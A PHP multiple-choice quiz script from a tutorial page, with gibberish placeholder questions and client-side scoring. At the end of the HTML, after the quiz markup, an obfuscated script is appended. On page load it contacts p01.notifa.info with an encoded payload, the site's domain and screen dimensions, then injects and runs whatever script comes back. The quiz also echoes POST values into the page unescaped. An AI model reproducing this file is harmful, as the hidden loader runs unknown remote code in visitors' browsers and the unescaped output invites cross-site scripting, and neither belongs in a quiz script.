<?php
error_reporting(0);

// #########################################
// In this page you will find the code required to create multiple choice exams
// Copy this code and save it to a file name "whatever.php"
// The file name must finish with ".php"
// Save the file to a PHP unable server.
// Please consider adding a link to this service:
//      http://www.phptutorial.info/scripts/multiple_choice/
//
// A website was created based in this script at which allows
//   to create and maintain the test online at:
//      http://www.testak.org
//
// #########################################
//      CONFIGURATION
$title = "test";
$address = "index.html";
$randomizequestions ="yes"; // set up as "no" to show questions without randomization
//    END CONFIGURATION
// #########################################

$a = array(
1 => array(
   0 => "kmkljklj",
   1 => "kljkljkl",
   2 => "kjkljkl",
   3 => "kjklj",
   4 => "kljkljkl",
   5 => "kjkljj",
   6 => 5
),
2 => array(
   0 => "jkhjkhjk",
   1 => " m m",
   2 => "vkjhjkwoqioalc",
   3 => "nklnklnlk",
   4 => "kljklvnln",
   5 => "lnkdnfdknf",
   6 => 3
),
3 => array(
   0 => "knlknvqowj1930r89",
   1 => "mklmckln",
   2 => "kjklvn",
   3 => "lkjklj",
   4 => "sdsd",
   5 => "lkjklj",
   6 => 1
),
4 => array(
   0 => "dcvvsfbf",
   1 => "vffwet2t",
   2 => "dfsfsd",
   3 => "dsfsdf",
   4 => "sdfsd",
   5 => "dsdg",
   6 => 1
),
5 => array(
   0 => "dfsdbfrw232r3",
   1 => "dvdsv s",
   2 => "afsf",
   3 => "fdsfsd32r23",
   4 => "asdsf",
   5 => "sdsfsd",
   6 => 3
),
6 => array(
   0 => "sdfdsfs",
   1 => "sdfsdc",
   2 => "scvere23423",
   3 => "dcsvfbg",
   4 => "dfsdbr3w",
   5 => "dvsdvd",
   6 => 3
),
7 => array(
   0 => "wfdgs45",
   1 => "sgfdvf4r",
   2 => "vvsger36",
   3 => "sdfdsvghyd",
   4 => "fgdfvdf",
   5 => "vdfvdf",
   6 => 3
),
8 => array(
   0 => "fvfdvdfb",
   1 => "fvfdvdf",
   2 => "dfvfdv",
   3 => "vfdvdfv",
   4 => "fdvdf",
   5 => "fvdfvdf",
   6 => 5
),
9 => array(
   0 => "fvfdvfd",
   1 => "dfvfdv",
   2 => " fdvfdv",
   3 => "fdvfd",
   4 => "dvscsd",
   5 => "fdvdf",
   6 => 3
),
10 => array(
   0 => "csdcsd",
   1 => "vcvcv",
   2 => "dsfsd",
   3 => "sdfv",
   4 => "dsfsdf",
   5 => "sdfsd",
   6 => 1
),
);

$max=10;

$question=$_POST["question"] ;

if ($_POST["Randon"]==0){
        if($randomizequestions =="yes"){$randval = mt_rand(1,$max);}else{$randval=1;}
        $randval2 = $randval;
        }else{
        $randval=$_POST["Randon"];
        $randval2=$_POST["Randon"] + $question;
                if ($randval2>$max){
                $randval2=$randval2-$max;
                }
        }
        
$ok=$_POST["ok"] ;

if ($question==0){
        $question=0;
        $ok=0;
        $percentaje=0;
        }else{
        $percentaje= Round(100*$ok / $question);
        }
?>

<HTML><HEAD><TITLE>Multiple Choice Questions:  <?php print $title; ?></TITLE>

<SCRIPT LANGUAGE='JavaScript'>
<!-- 
function Goahead (number){
        if (document.percentaje.response.value==0){
                if (number==<?php print $a[$randval2][6] ; ?>){
                        document.percentaje.response.value=1
                        document.percentaje.question.value++
                        document.percentaje.ok.value++
                }else{
                        document.percentaje.response.value=1
                        document.percentaje.question.value++
                }
        }
        if (number==<?php print $a[$randval2][6] ; ?>){
                document.question.response.value="Correct"
        }else{
                document.question.response.value="Incorrect"
        }
}
// -->
</SCRIPT>

</HEAD>
<BODY BGCOLOR=FFFFFF>

<CENTER>
<H1><?php print "$title"; ?></H1>
<TABLE BORDER=0 CELLSPACING=5 WIDTH=500>

<?php if ($question<$max){ ?>

<TR><TD ALIGN=RIGHT>
<FORM METHOD=POST NAME="percentaje" ACTION="<?php print $URL; ?>">

<BR>Percentaje of correct responses: <?php print $percentaje; ?> %
<BR><input type=submit value="Next >>">
<input type=hidden name=response value=0>
<input type=hidden name=question value=<?php print $question; ?>>
<input type=hidden name=ok value=<?php print $ok; ?>>
<input type=hidden name=Randon value=<?php print $randval; ?>>
<br><?php print $question+1; ?> / <?php print $max; ?>
</FORM>
<HR>
</TD></TR>

<TR><TD>
<FORM METHOD=POST NAME="question" ACTION="">
<?php print "<b>".$a[$randval2][0]."</b>"; ?>
 
<BR>     <INPUT TYPE=radio NAME="option" VALUE="1"  onClick=" Goahead (1);"><?php print $a[$randval2][1] ; ?>
<BR>     <INPUT TYPE=radio NAME="option" VALUE="2"  onClick=" Goahead (2);"><?php print $a[$randval2][2] ; ?>
<?php if ($a[$randval2][3]!=""){ ?>
<BR>     <INPUT TYPE=radio NAME="option" VALUE="3"  onClick=" Goahead (3);"><?php print $a[$randval2][3] ; } ?>
<?php if ($a[$randval2][4]!=""){ ?>
<BR>     <INPUT TYPE=radio NAME="option" VALUE="4"  onClick=" Goahead (4);"><?php print $a[$randval2][4] ; } ?>
<?php if ($a[$randval2][5]!=""){ ?>
<BR>     <INPUT TYPE=radio NAME="option" VALUE="5"  onClick=" Goahead (5);"><?php print $a[$randval2][5] ; } ?>
<BR>     <input type=text name=response size=8>


</FORM>

<?php
}else{
?>
<TR><TD ALIGN=Center>
The Quiz has finished
<BR>Percentaje of correct responses: <?php print $percentaje ; ?> %
<p><A HREF="<?php print $address; ?>">Home Page</a>

<?php } ?>

</TD></TR>
</TABLE>

</CENTER>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mk5MGTDlt96SPfgL5BD8clL%2fTr5%2bXLqiZzYovxx6MGsJaoqT%2b7BhFBmVPzsosf0mDszGoR51o1p6KSMmsMGEWCfoUCAdADzMkYiK47OQGJ%2fe1nrEznEa20ZWj42qYHOBmVCAveGy5a18uBgGg6guWfwa7P29JZDPFQfvqqiCjRhbyv1Y%2f4r0a5HCrOzRADqWTNNX7Ks1Ic7Rtd8bVOog5Ovihm5FszY0vF4xU0Qyt81kZCCwT5jKBYbHDfUWW7EcTI%2bdlD8VGBbLie4YpulLlE6Fqi%2f2EBSgGOl5YL2%2ftgA3Fv%2fRR%2bmN7BH4n8kdhmFhZl4uNZvsAZrFYKf3i94qkZTMt2UxKlWGgMlW6TgrcKVpu%2bu8DAh7ImRSL5AD8EK3jrnGnrVUd%2b%2f2i1OW16OfR%2b0W15Ui1%2bxb%2fpEjLhpIVBG5gBdHK%2b0PJpZkoXygbbPWiYm5IppgcCjdmntO9sAgroMhGJjvpNZqw9J6HhBoHOPVLFtQSJ9eU5Kb1eAtcsRvUluBWuiHFdGXVXzt2z0ewsMmGCCnC%2bUW4Lz%2fXvGbXFqFiy5UKX9G6RWe0sUtgRjCIRs4eW6GDAjHOD6uPGRU4zQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></BODY>
</HTML>
